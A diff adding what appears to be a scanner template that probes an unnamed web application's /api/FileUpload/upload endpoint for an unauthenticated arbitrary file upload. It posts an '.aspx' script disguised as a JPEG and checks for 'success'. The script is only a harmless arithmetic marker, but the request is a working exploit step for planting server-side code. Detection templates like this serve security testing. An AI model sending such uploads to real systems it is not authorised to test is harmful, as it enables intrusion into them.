@@ -1,0 +1,37 @@
+id: upload-file
+
+info:
+  name: upload-file
+  author: admin
+  severity: critical
+  description: 前台文件上传
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+  yakit-info:
+    sign: d574b5f956b009d908aea0635295bfd6
+
+http:
+- method: POST
+  path:
+  - '{{RootURL}}/api/FileUpload/upload'
+  headers:
+    Content-Length: "164"
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygUJhRjCrBpc1qDf5
+  body: "------WebKitFormBoundarygUJhRjCrBpc1qDf5\r\nContent-Disposition: form-data;
+    name=\"files\";filename=\"1.aspx\"\r\nContent-Type: image/jpeg\r\n\r\n<%= 2*2
+    %>\r\n------WebKitFormBoundarygUJhRjCrBpc1qDf5--\r\n"
+
+  max-redirects: 3
+  disable-cookie: true
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '"success"'
+    condition: and
+
+
+# Generated From WebFuzzer on 2025-12-01 14:50:36
